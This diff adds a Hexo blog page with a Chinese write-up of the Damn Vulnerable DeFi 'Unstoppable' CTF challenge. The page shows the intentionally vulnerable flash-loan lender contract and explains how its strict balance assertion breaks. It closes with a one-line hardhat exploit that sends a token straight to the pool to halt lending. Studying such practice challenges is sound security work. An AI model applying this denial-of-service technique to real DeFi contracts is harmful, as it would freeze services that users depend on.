@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css" integrity="sha256-AbA177XfpSnFEvgpYu1jMygiLabzPCJCRIBtR5jGc0k=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"mouke180.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.13.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="Damn Vulnerable Defi Unstoppable wp1.代码分析Unstoppable 题目要求我们阻止借贷池子继续向用户借钱，这道题给了我们两个合约，一个是 ReceiverUnstoppable.sol 合约，一个是 UnstoppableLender.sol 合约，我们先看 UnstoppableLender.sol 合约。 UnstoppableLender.sol123">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Unstoppable">
+<meta property="og:url" content="https://mouke180.github.io/2022/11/26/Unstoppable/index.html">
+<meta property="og:site_name" content="Yuki&#39;s Blog">
+<meta property="og:description" content="Damn Vulnerable Defi Unstoppable wp1.代码分析Unstoppable 题目要求我们阻止借贷池子继续向用户借钱，这道题给了我们两个合约，一个是 ReceiverUnstoppable.sol 合约，一个是 UnstoppableLender.sol 合约，我们先看 UnstoppableLender.sol 合约。 UnstoppableLender.sol123">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-11-26T13:26:17.000Z">
+<meta property="article:modified_time" content="2022-11-28T12:30:11.082Z">
+<meta property="article:author" content="Yuki">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://mouke180.github.io/2022/11/26/Unstoppable/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://mouke180.github.io/2022/11/26/Unstoppable/","path":"2022/11/26/Unstoppable/","title":"Unstoppable"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Unstoppable | Yuki's Blog</title>
+  
+
+
+
+
+
+
+  <script async defer data-website-id="" src=""></script>
+
+  <script defer data-domain="" src=""></script>
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Yuki's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">Love zhu</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Damn-Vulnerable-Defi-Unstoppable-wp"><span class="nav-number">1.</span> <span class="nav-text">Damn Vulnerable Defi Unstoppable wp</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-number">1.1.</span> <span class="nav-text">1.代码分析</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#UnstoppableLender-sol"><span class="nav-number">1.1.0.1.</span> <span class="nav-text">UnstoppableLender.sol</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%94%BB%E5%87%BB"><span class="nav-number">1.2.</span> <span class="nav-text">2.攻击</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Yuki</p>
+  <div class="site-description" itemprop="description">Happy Everyday</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">3</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://mouke180.github.io/2022/11/26/Unstoppable/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Yuki">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Yuki's Blog">
+      <meta itemprop="description" content="Happy Everyday">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Unstoppable | Yuki's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Unstoppable
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-11-26 21:26:17" itemprop="dateCreated datePublished" datetime="2022-11-26T21:26:17+08:00">2022-11-26</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-11-28 20:30:11" itemprop="dateModified" datetime="2022-11-28T20:30:11+08:00">2022-11-28</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h2 id="Damn-Vulnerable-Defi-Unstoppable-wp"><a href="#Damn-Vulnerable-Defi-Unstoppable-wp" class="headerlink" title="Damn Vulnerable Defi Unstoppable wp"></a>Damn Vulnerable Defi Unstoppable wp</h2><h3 id="1-代码分析"><a href="#1-代码分析" class="headerlink" title="1.代码分析"></a>1.代码分析</h3><p>Unstoppable 题目要求我们阻止借贷池子继续向用户借钱，这道题给了我们两个合约，一个是 ReceiverUnstoppable.sol 合约，一个是 UnstoppableLender.sol 合约，我们先看 UnstoppableLender.sol 合约。</p>
+<h5 id="UnstoppableLender-sol"><a href="#UnstoppableLender-sol" class="headerlink" title="UnstoppableLender.sol"></a>UnstoppableLender.sol</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">IReceiver</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">receiveTokens</span>(<span class="params">address tokenAddress, uint256 amount</span>) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@title</span> <span class="variable">UnstoppableLender</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">contract <span class="title class_">UnstoppableLender</span> is <span class="title class_">ReentrancyGuard</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">IERC20</span> public immutable damnValuableToken;</span><br><span class="line">    uint256 public poolBalance;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address tokenAddress</span>) &#123;</span><br><span class="line">        <span class="built_in">require</span>(tokenAddress != <span class="title function_">address</span>(<span class="number">0</span>), <span class="string">&quot;Token address cannot be zero&quot;</span>);</span><br><span class="line">        damnValuableToken = <span class="title class_">IERC20</span>(tokenAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">depositTokens</span>(<span class="params">uint256 amount</span>) external nonReentrant &#123;</span><br><span class="line">        <span class="built_in">require</span>(amount &gt; <span class="number">0</span>, <span class="string">&quot;Must deposit at least one token&quot;</span>);</span><br><span class="line">        <span class="comment">// Transfer token from sender. Sender must have first approved them.</span></span><br><span class="line">        damnValuableToken.<span class="title function_">transferFrom</span>(msg.<span class="property">sender</span>, <span class="title function_">address</span>(<span class="variable language_">this</span>), amount);</span><br><span class="line">        poolBalance = poolBalance + amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">flashLoan</span>(<span class="params">uint256 borrowAmount</span>) external nonReentrant &#123;</span><br><span class="line">        <span class="built_in">require</span>(borrowAmount &gt; <span class="number">0</span>, <span class="string">&quot;Must borrow at least one token&quot;</span>);</span><br><span class="line"></span><br><span class="line">        uint256 balanceBefore = damnValuableToken.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>));</span><br><span class="line">        <span class="built_in">require</span>(balanceBefore &gt;= borrowAmount, <span class="string">&quot;Not enough tokens in pool&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Ensured by the protocol via the `depositTokens` function</span></span><br><span class="line">        <span class="title function_">assert</span>(poolBalance == balanceBefore);</span><br><span class="line">        </span><br><span class="line">        damnValuableToken.<span class="title function_">transfer</span>(msg.<span class="property">sender</span>, borrowAmount);</span><br><span class="line">        </span><br><span class="line">        <span class="title class_">IReceiver</span>(msg.<span class="property">sender</span>).<span class="title function_">receiveTokens</span>(<span class="title function_">address</span>(damnValuableToken), borrowAmount);</span><br><span class="line">        </span><br><span class="line">        uint256 balanceAfter = damnValuableToken.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>));</span><br><span class="line">        <span class="built_in">require</span>(balanceAfter &gt;= balanceBefore, <span class="string">&quot;Flash loan hasn&#x27;t been paid back&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>合约的结构很简单，只有两个函数，一个是 depositTokens 函数，一个是 flashLoan 函数，depositTokens 函数的功能是用户存钱到借贷合约，flashLoan 函数的功能是给用户借钱，我们主要看 flashLoan 函数。</p>
+<p>flashLoan 函数中有一行特别的判断：<br><code>assert(poolBalance == balanceBefore);</code><br>要求 poolBalance 变量等于 balanceBerfore 变量，poolBalance 变量只有在调用 depositTokens 函数的时候才会增加，而 balanceBefore 是用户借钱时借贷池子的金额，所以我们可以直接向合约转账，这样 poolBalance 的值不变，balanceBefore 的值会增加，这个判断就通过不了，我们就可以阻止这个池子继续提供贷款。</p>
+<h3 id="2-攻击"><a href="#2-攻击" class="headerlink" title="2.攻击"></a>2.攻击</h3><p>我们直接向 UnstoppableLender 合约转任意金额，然后用 hardhat 测试就可以了，攻击代码如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">it</span>(<span class="string">&#x27;Exploit&#x27;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">/** CODE YOUR EXPLOIT HERE */</span></span><br><span class="line">    <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">token</span>.<span class="title function_">transfer</span>(<span class="variable language_">this</span>.<span class="property">pool</span>.<span class="property">address</span>,<span class="number">1</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+            </div>
+            <div class="post-nav-item">
+                <a href="/2022/11/28/Lotteries/" rel="next" title="Lotteries">
+                  Lotteries <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Yuki</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
